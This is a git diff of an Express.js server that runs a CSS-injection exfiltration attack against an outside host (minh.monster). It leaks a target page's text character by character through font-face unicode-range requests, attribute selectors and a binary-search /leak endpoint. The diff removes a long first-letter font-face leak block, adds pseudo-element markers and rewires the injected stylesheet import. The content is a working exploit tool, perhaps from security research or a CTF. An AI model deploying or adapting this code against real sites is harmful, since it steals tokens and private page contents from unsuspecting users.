@@ -11,8 +11,7 @@ app.disable('etag');
 // Config
 const PORT = 3000;
 const HOSTNAME = "https://minh.monster";
-//let PREFIX = 'willBeSetLater';
-let PREFIX = 'willBeSetLater';
+const PREFIX = '|';
 const CHARSET = "eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^";
 const LOG = 4;
 const DEBUG = true;
@@ -38,393 +37,6 @@ function genSelectorArray() {
 		selectorArray.push(tmpMinSelectorToTarget += ":not(any" + i + ")");
 	}
 
-}
-
-function genFirstLetterExfilCSS() {
-firstLetterExfilCSS = `
-@import '` + HOSTNAME + `/start';
-
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=z); /* not fetched */
- unicode-range:U+007A;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=y); /* not fetched */
- unicode-range:U+0079;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=x); /* not fetched */
- unicode-range:U+0078;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=w); /* not fetched */
- unicode-range:U+0077;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=v); /* not fetched */
- unicode-range:U+0076;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=u); /* not fetched */
- unicode-range:U+0075;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=t); /* not fetched */
- unicode-range:U+0074;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=s); /* not fetched */
- unicode-range:U+0073;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=r); /* not fetched */
- unicode-range:U+0072;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=q); /* not fetched */
- unicode-range:U+0071;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=p); /* not fetched */
- unicode-range:U+0070;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=o); /* not fetched */
- unicode-range:U+006F;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=n); /* not fetched */
- unicode-range:U+006E;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=m); /* not fetched */
- unicode-range:U+006D;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=l); /* not fetched */
- unicode-range:U+006C;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=k); /* not fetched */
- unicode-range:U+006B;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=j); /* not fetched */
- unicode-range:U+006A;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=i); /* not fetched */
- unicode-range:U+0069;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=h); /* not fetched */
- unicode-range:U+0068;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=g); /* not fetched */
- unicode-range:U+0067;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=f); /* not fetched */
- unicode-range:U+0066;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=e); /* not fetched */
- unicode-range:U+0065;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=d); /* not fetched */
- unicode-range:U+0064;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=c); /* fetched too */
- unicode-range:U+0063;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=b); /* fetched */
- unicode-range:U+0062;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=a); /* fetched */
- unicode-range:U+0061;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=Z); /* not fetched */
- unicode-range:U+005A;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=Y); /* not fetched */
- unicode-range:U+0059;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=X); /* not fetched */
- unicode-range:U+0058;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=W); /* not fetched */
- unicode-range:U+0057;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=V); /* not fetched */
- unicode-range:U+0056;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=U); /* not fetched */
- unicode-range:U+0055;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=T); /* not fetched */
- unicode-range:U+0054;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=S); /* not fetched */
- unicode-range:U+0053;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=R); /* not fetched */
- unicode-range:U+0052;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=Q); /* not fetched */
- unicode-range:U+0051;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=P); /* not fetched */
- unicode-range:U+0050;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=O); /* not fetched */
- unicode-range:U+004F;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=N); /* not fetched */
- unicode-range:U+004E;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=M); /* not fetched */
- unicode-range:U+004D;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=L); /* not fetched */
- unicode-range:U+004C;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=K); /* not fetched */
- unicode-range:U+004B;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=J); /* not fetched */
- unicode-range:U+004A;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=I); /* not fetched */
- unicode-range:U+0049
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=H); /* not fetched */
- unicode-range:U+0048;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=G); /* not fetched */
- unicode-range:U+0047;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=F); /* not fetched */
- unicode-range:U+0046;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=E); /* not fetched */
- unicode-range:U+0045;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=D); /* not fetched */
- unicode-range:U+0044;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=C); /* not fetched */
- unicode-range:U+0043;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=B); /* fetched too */
- unicode-range:U+0042;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=A); /* fetched */
- unicode-range:U+0041;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=0); /* not fetched */
- unicode-range:U+0030;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=1); /* not fetched */
- unicode-range:U+0031;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=2); /* not fetched */
- unicode-range:U+0032;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=3); /* not fetched */
- unicode-range:U+0033;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=4); /* not fetched */
- unicode-range:U+0034;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=5); /* not fetched */
- unicode-range:U+0035;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=6); /* not fetched */
- unicode-range:U+0036;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=7); /* not fetched */
- unicode-range:U+0037;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=8); /* not fetched */
- unicode-range:U+0038;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=9); /* not fetched */
- unicode-range:U+0039;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=21); /* not fetched */
- unicode-range:U+0021;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=24); /* not fetched */
- unicode-range:U+0024;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=25); /* not fetched */
- unicode-range:U+0025;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=26); /* not fetched */
- unicode-range:U+0026;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=27); /* not fetched */
- unicode-range:U+0027;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=28); /* not fetched */
- unicode-range:U+0028;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=29); /* not fetched */
- unicode-range:U+0029;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=30); /* not fetched */
- unicode-range:U+002A;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=31); /* not fetched */
- unicode-range:U+002B;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=32); /* not fetched */
- unicode-range:U+002C;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=33); /* not fetched */
- unicode-range:U+002D;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=34); /* not fetched */
- unicode-range:U+002E;
-}
-@font-face{
- font-family:poc;
- src: url(` + HOSTNAME + `/first?c=35); /* not fetched */
- unicode-range:U+002F;
-}
-
-` + minSelectorToTarget + `::first-letter {
-    font-family: 'poc';
-}
-
-`;
 }
 
 // thanks to @SecurityMB:
@@ -533,6 +145,12 @@ function genInjection (selector='.foo', iterations=0, width='450px', delay='1s',
     z-index: ${iterations};
     letter-spacing: normal !important;
 }
+${selectorArray[n]}::before {
+    content: "|";
+}
+${selectorArray[n]}::after {
+    content: "|";
+}
 ${selectorArray[n]}::-webkit-scrollbar {
     background: blue;
 }
@@ -542,11 +160,11 @@ ${selectorArray[n]}::-webkit-scrollbar:horizontal {
 
 ${displaySelectorArray[n]}:after{
     color: #155724;
-	background-color: #d4edda;
-	border-color: #c3e6cb;
-	padding: 0.75rem 1.25rem;
-	border: 1px solid transparent;
-    content: "Exfiltrating... \\0a \\0a Exfiltrated: ${PREFIX+input}";
+    background-color: #d4edda;
+    border-color: #c3e6cb;
+    padding: 0.75rem 1.25rem;
+    border: 1px solid transparent;
+    content: "Exfiltrating... \\0a \\0a Exfiltrated: ${input}";
     position:fixed;
     left:0;
     top:100px;
@@ -601,16 +219,14 @@ function sleepAsync(milliseconds) {
 
 // first request, reset everything
 app.get("/start", (req, res) => {
-    sleepAsync(1000).then(() => {
-	    log("===============================");
-	    ready = 1;
-	    n = 0;
-	    pending = [];
-	    chars = CHARSET;
-	    input = "";
-	    ttl = 0;
-	    genResponse(res, ttl, chars);
-    });
+    log("===============================");
+    ready = 1;
+    n = 0;
+    pending = [];
+    chars = CHARSET;
+    input = "";
+    ttl = 0;
+    genResponse(res, ttl, chars);
 });
 
 
@@ -628,7 +244,7 @@ app.get("/leak", (req, res) => {
         } else {
             chars = req.query.chars; // keep binary search
         }
-        console.log('recv: %s', (PREFIX+input));
+        console.log('recv: %s', (input));
     } else {
         return;
     }
@@ -653,13 +269,12 @@ app.get("/next", (req, res) => {
     }
 });
 
-app.get('/:wildcard/minSelectorToTarget.css', (req, res) => {
+app.get('/:wildcard/css.css', (req, res) => {
 	minSelectorToTarget = req.params.wildcard
 	console.log(minSelectorToTarget);
-	genFirstLetterExfilCSS()
 	genSelectorArray();
 	res.setHeader('Content-Type', 'text/css');
-	res.send(firstLetterExfilCSS);
+	res.send("@import 'https://minh.monster/start'");
 });
 
 app.get('/index.html', (req, res) => {
@@ -667,17 +282,6 @@ app.get('/index.html', (req, res) => {
 		root: '.'
 	});
 });
-
-app.get('/css.css', (req, res) => {
-	res.sendFile('css.css', {
-		root: '.'
-	});
-});
-
-app.get('/first', (req, res) => {
-	PREFIX = req.query.c;
-});
-
 
 app.listen(PORT, () => {
 	console.log(`Listening on ${PORT}...`);
